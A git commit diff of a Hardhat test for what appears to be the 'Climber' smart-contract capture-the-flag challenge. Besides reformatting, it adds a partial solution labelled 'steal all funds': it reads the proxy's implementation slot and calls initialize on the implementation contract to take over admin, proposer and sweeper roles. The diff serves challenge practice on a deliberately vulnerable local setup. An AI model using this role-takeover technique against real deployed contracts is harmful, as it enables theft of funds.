63fed3a31ad928628bd0856699f6ae4f0bd49681
santipu <santipujolsau@gmail.com>
2023-02-21 15:01:27 +0100

    Started challenge climber

--- test/climber/climber.challenge.js
+++ test/climber/climber.challenge.js
@@ -1,68 +1,104 @@
-const { ethers, upgrades } = require('hardhat');
-const { expect } = require('chai');
-const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+const { ethers, upgrades } = require("hardhat");
+const { expect } = require("chai");
+const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
 
-describe('[Challenge] Climber', function () {
-    let deployer, proposer, sweeper, player;
-    let timelock, vault, token;
+describe("[Challenge] Climber", function () {
+  let deployer, proposer, sweeper, player;
+  let timelock, vault, token;
 
-    const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
-    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
-    const TIMELOCK_DELAY = 60 * 60;
+  const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
+  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
+  const TIMELOCK_DELAY = 60 * 60;
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, proposer, sweeper, player] = await ethers.getSigners();
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, proposer, sweeper, player] = await ethers.getSigners();
 
-        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
-        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
-        
-        // Deploy the vault behind a proxy using the UUPS pattern,
-        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
-        vault = await upgrades.deployProxy(
-            await ethers.getContractFactory('ClimberVault', deployer),
-            [ deployer.address, proposer.address, sweeper.address ],
-            { kind: 'uups' }
-        );
+    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
+    expect(await ethers.provider.getBalance(player.address)).to.equal(
+      PLAYER_INITIAL_ETH_BALANCE
+    );
 
-        expect(await vault.getSweeper()).to.eq(sweeper.address);
-        expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
-        expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
-        expect(await vault.owner()).to.not.eq(deployer.address);
-        
-        // Instantiate timelock
-        let timelockAddress = await vault.owner();
-        timelock = await (
-            await ethers.getContractFactory('ClimberTimelock', deployer)
-        ).attach(timelockAddress);
-        
-        // Ensure timelock delay is correct and cannot be changed
-        expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
-        await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, 'CallerNotTimelock');
-        
-        // Ensure timelock roles are correctly initialized
-        expect(
-            await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
-        ).to.be.true;
-        expect(
-            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
-        ).to.be.true;
-        expect(
-            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
-        ).to.be.true;
+    // Deploy the vault behind a proxy using the UUPS pattern,
+    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
+    vault = await upgrades.deployProxy(
+      await ethers.getContractFactory("ClimberVault", deployer),
+      [deployer.address, proposer.address, sweeper.address],
+      { kind: "uups" }
+    );
 
-        // Deploy token and transfer initial token balance to the vault
-        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
-    });
+    expect(await vault.getSweeper()).to.eq(sweeper.address);
+    expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
+    expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
+    expect(await vault.owner()).to.not.eq(deployer.address);
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
-    });
+    // Instantiate timelock
+    let timelockAddress = await vault.owner();
+    timelock = await (
+      await ethers.getContractFactory("ClimberTimelock", deployer)
+    ).attach(timelockAddress);
 
-    after(async function () {
-        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-        expect(await token.balanceOf(vault.address)).to.eq(0);
-        expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
-    });
+    // Ensure timelock delay is correct and cannot be changed
+    expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
+    await expect(
+      timelock.updateDelay(TIMELOCK_DELAY + 1)
+    ).to.be.revertedWithCustomError(timelock, "CallerNotTimelock");
+
+    // Ensure timelock roles are correctly initialized
+    expect(
+      await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
+    ).to.be.true;
+    expect(
+      await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
+    ).to.be.true;
+    expect(
+      await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
+    ).to.be.true;
+
+    // Deploy token and transfer initial token balance to the vault
+    token = await (
+      await ethers.getContractFactory("DamnValuableToken", deployer)
+    ).deploy();
+    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
+  });
+
+  it("Execution", async function () {
+    /** CODE YOUR SOLUTION HERE */
+    /**
+     * KEY ATTACK VECTOR: become the sweeper and steal all funds
+     */
+    console.log(vault.address);
+    console.log(await vault.getSweeper());
+
+    const implementationSlot = await ethers.provider.getStorageAt(
+      vault.address,
+      "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
+    );
+    const implementationAddress = "0x" + implementationSlot.slice(26);
+    console.log(implementationAddress);
+    console.log(await ethers.provider.getStorageAt(implementationAddress, 0));
+
+    const iface = new ethers.utils.Interface([
+      "function initialize(address admin, address proposer, address sweeper)",
+    ]);
+    const encodedData = iface.encodeFunctionData("initialize", [
+      player.address,
+      player.address,
+      player.address,
+    ]);
+    const implementationContract = await ethers.getContractAt(
+      "ClimberVault",
+      implementationAddress
+    );
+    const sweeper = await implementationContract
+      .connect(player)
+      .initialize(player.address, player.address, player.address);
+    console.log(sweeper);
+  });
+
+  after(async function () {
+    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+    expect(await token.balanceOf(vault.address)).to.eq(0);
+    expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
+  });
 });
